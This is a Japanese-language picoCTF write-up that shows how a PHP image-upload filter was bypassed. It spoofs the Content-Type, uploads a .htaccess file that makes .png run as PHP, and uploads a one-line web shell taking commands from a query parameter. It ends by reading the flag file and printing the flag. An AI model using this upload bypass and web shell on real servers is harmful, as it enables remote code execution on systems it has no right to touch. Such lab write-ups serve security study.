# byp4ss3d

## 解法

```.png```, ```.jpg```, ```.gif```形式だけがアップロードの対象になっているので適当なファイルを送信するとヘッダー部分に次のような記載がありました。
```
------WebKitFormBoundaryWCVporVQiz0CYFxA
Content-Disposition: form-data; name="image"; filename="example.txt"
Content-Type: plain/txt

hello!
------WebKitFormBoundaryWCVporVQiz0CYFxA--
```

そのまま送信するとNot allowed!と表示されます。

pngの場合は```Content-type```が```image/png```になったので、そこだけ変更して同じファイルを送信すると通りました。

そこから更に```filename=".."```に変更すると次のような警告が出ます。

```
Warning: move_uploaded_file(): The second argument to copy() function cannot be a directory in /var/www/html/upload.php on line 18

Warning: move_uploaded_file(): Unable to move "/tmp/phphB2ZME" to "images/.." in /var/www/html/upload.php on line 18
Upload failed.
```

つまりこのシステムではアップロードされたファイルを```move_uploaded_file()```で```images/<filename>```にコピーしていることが分かります。

ここで```.htaccess```を用いてpngをphpとして解釈するよう挙動を変えます。具体的には.htaccessのファイルの内容を

```
AddType application/x-httpd-php .png
```

とします。このファイルにはアクセスできませんが、次の```payload.png```をアップロードすることでRCEを可能にします。

```php
<?php system($_GET['cmd']); ?>
```

> クエリストリングのcmdをsystem()で処理するペイロードなのでURLを変えるだけでコマンドをたくさん試せる。

この結果、次のようなエラーが返ってきます。

```
 Warning: Undefined array key "cmd" in /var/www/html/images/payload.png on line 1


Deprecated: system(): Passing null to parameter #1 ($command) of type string is deprecated in /var/www/html/images/payload.png on line 1


Fatal error: Uncaught ValueError: system(): Argument #1 ($command) cannot be empty in /var/www/html/images/payload.png:1 Stack trace: #0 /var/www/html/images/payload.png(1): system('') #1 {main} thrown in /var/www/html/images/payload.png on line 1 
```

php自体は解釈されているので後はクエリスリングで任意のコマンドを入力できるようになりました。

```
http://amiable-citadel.picoctf.net:55223/images/payload.png?cmd=<任意のコマンド>
```

```../../flag.txt```の内容を読み込んでフラグを獲得しました。

```
picoCTF{s3rv3r_byp4ss_77c49c68}
```